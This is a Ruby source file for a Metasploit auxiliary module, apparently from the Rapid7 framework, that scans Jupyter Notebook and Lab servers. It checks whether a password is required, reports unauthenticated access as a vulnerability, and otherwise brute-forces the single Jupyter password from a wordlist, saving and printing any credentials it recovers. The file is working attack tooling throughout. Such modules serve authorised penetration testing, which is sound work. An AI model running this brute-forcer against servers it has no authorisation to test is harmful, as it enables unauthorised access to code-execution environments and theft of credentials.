##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/jupyter'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  def initialize
    super(
      'Name' => 'Jupyter Login Utility',
      'Description' => %q{
        This module checks if authentication is required on a Jupyter Lab or Notebook server. If it is, this module will
        bruteforce the password. Jupyter only requires a password to authenticate, usernames are not used. This module
        is compatible with versions 4.3.0 (released 2016-12-08) and newer.
      },
      'Author' => [ 'Spencer McIntyre' ],
      'License' => MSF_LICENSE
    )

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'The path to the Jupyter application', '/' ]),
        Opt::RPORT(8888)
      ]
    )

    deregister_options(
      'DB_ALL_CREDS', 'DB_ALL_USERS', 'DB_SKIP_EXISTING',
      'HttpUsername', 'PASSWORD_SPRAY', 'STOP_ON_SUCCESS', 'USERNAME', 'USERPASS_FILE', 'USER_AS_PASS', 'USER_FILE'
    )

    register_autofilter_ports([ 80, 443, 8888 ])
  end

  def requires_password?(_ip)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'tree')
    })

    return false if res&.code == 200

    destination = res.headers['Location'].split('?', 2)[0]
    return true if destination.end_with?(normalize_uri(target_uri.path, 'login'))

    fail_with(Failure::UnexpectedReply, 'The server responded with a redirect that did not match a known fingerprint')
  end

  def run_host(ip)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api')
    })
    fail_with(Failure::Unreachable, 'Failed to fetch the Jupyter API version') if res.nil?

    version = res&.get_json_document&.dig('version')
    fail_with(Failure::UnexpectedReply, 'Failed to fetch the Jupyter API version') if version.nil?

    vprint_status "#{peer} - The server responded that it is running Jupyter version: #{version}"

    unless requires_password?(ip)
      print_good "#{peer} - No password is required."
      report_vuln(
        host: ip,
        port: rport,
        proto: 'tcp',
        sname: (ssl ? 'https' : 'http'),
        name: 'Unauthenticated Jupyter Access',
        info: "Module #{fullname} confirmed unauthenticated access to the Jupyter application"
      )
      return
    end

    cred_collection = Metasploit::Framework::PrivateCredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file: datastore['PASS_FILE'],
      password: datastore['PASSWORD']
    )
    cred_collection = prepend_db_passwords(cred_collection)

    scanner = Metasploit::Framework::LoginScanner::Jupyter.new(
      configure_http_login_scanner(
        uri: normalize_uri(target_uri.path, 'login'),
        cred_details: cred_collection,
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 10,
        http_password: datastore['HttpPassword'],
        # there is only one password and no username, so don't bother continuing
        stop_on_success: true
      )
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
        module_fullname: fullname,
        workspace_id: myworkspace_id
      )
      if result.success?
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)

        print_good "#{peer} - Login Successful: #{result.credential}"
      else
        invalidate_login(credential_data)
        vprint_error "#{peer} - LOGIN FAILED: #{result.credential} (#{result.status})"
      end
    end
  end
end
